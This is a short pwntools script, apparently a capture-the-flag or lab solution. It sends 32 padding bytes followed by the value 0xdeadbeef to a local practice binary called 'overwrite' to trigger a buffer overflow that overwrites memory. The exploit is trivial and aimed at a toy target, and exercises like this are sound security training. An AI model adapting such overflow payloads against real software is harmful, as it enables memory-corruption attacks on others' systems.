from pwn import *

io = process('./overwrite')

io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))

print(io.recvall().decode())
